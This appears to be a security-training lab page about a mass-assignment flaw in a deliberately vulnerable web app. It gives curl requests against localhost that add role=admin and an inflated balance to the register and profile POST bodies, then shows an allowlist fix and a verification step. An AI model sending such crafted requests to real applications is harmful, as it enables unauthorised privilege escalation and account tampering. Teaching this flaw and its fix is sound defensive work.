# Lab 04: Mass assignment → admin

Registration and the profile form forward the whole request body to the database layer. Any field — including `role` and `balance` — is written to the user row.

**OWASP Top 10:2025:** [A06 Insecure Design](https://owasp.org/Top10/2025/)

**Code:** `routes/auth.js` (`/register`), `routes/account.js` (`/account`), `model/db.js` (`updateProfile`), `views/register.ejs`

## Exploit 1: register as admin

The register form shows a `role` field (the lab makes the vector obvious; a real attack adds the field to a crafted POST):

```bash
curl -s -X POST http://localhost:8888/register \
  -d "username=pwn&password=pwn123&role=admin"
```

## Exploit 2: promote yourself from the profile form

Log in as alice, then:

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/account \
  --data "email=alice%40example.com" --data "role=admin" --data "balance=999999"
```

Alice is now `admin` with a 9,999.99 € balance — confirm in the UI or:

```sql
SELECT username, role, balance FROM users WHERE username = 'alice';
```

## Why it happens

`req.body` → database without an allowlist. The form does not render a field? Send it anyway — the server never checks.

## Fix

Bind explicitly, field by field:

```js
// routes/account.js
await db.updateProfile(req.session.userId, {
  username: req.body.username,
  email: req.body.email,
});

// model/db.js — build the SET clause only from an allowlist
const ALLOWED = ["username", "email"];
```

Bonus hardening: derive `role` changes from a dedicated admin-only flow, never from a shared handler.

## Verify

After the fix, `role=admin` in the POST changes nothing; `req.session.role` stays `customer`.